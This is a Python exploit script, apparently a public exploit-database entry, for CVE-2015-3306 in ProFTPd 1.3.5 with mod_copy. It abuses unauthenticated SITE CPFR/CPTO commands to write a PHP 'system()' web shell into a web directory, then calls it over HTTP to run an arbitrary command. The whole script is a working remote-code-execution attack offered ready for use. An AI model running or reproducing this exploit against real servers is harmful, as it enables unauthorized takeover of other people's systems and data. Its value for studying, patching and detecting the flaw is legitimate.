# Date : 20/04/2015
# Author: R-73eN
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Kali Linux 1.06
# CVE : 2015-3306
# Greetz to Vadim Melihow for all the hard work .
import socket
import sys
import requests
#Banner
banner = ""
banner += "  ___        __        ____                 _    _  \n" 
banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
banner +="  | || &#039;_ \| |_ / _ \| |  _ / _ \ &#039;_ \    / _ \ | |    \n"
banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
print banner
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if(len(sys.argv) < 4):
    print &#039;\n Usage : exploit.py server directory cmd&#039;
else:
    server = sys.argv[1] #Vulnerable Server
    directory = sys.argv[2] # Path accessible from web .....
    cmd = sys.argv[3] #PHP payload to be executed
    evil = &#039;<?php system("&#039; + cmd + &#039;") ?>&#039;
    s.connect((server, 21))
    s.recv(1024)
    print &#039;[ + ] Connected to server [ + ] \n&#039;
    s.send(&#039;site cpfr /etc/passwd&#039;)
    s.recv(1024)
    s.send(&#039;site cpto &#039; + evil)
    s.recv(1024)
    s.send(&#039;site cpfr /proc/self/fd/3&#039;)
    s.recv(1024)
    s.send(&#039;site cpto &#039; + directory + &#039;infogen.php&#039;)
    s.recv(1024)
    s.close()
    print &#039;[ + ] Payload sended [ + ]\n&#039;
    print &#039;[ + ] Executing Payload [ + ]\n&#039;
    r = requests.get(&#039;http://&#039; + server + &#039;/infogen.php&#039;) #Executing PHP payload through HTTP
    if (r.status_code == 200):
        print &#039;[ * ] Payload Executed Succesfully [ * ]&#039;
    else:
        print &#039; [ - ] Error : &#039; + str(r.status_code) + &#039; [ - ]&#039;
         
print &#039;\n http://infogen.al/&#039;

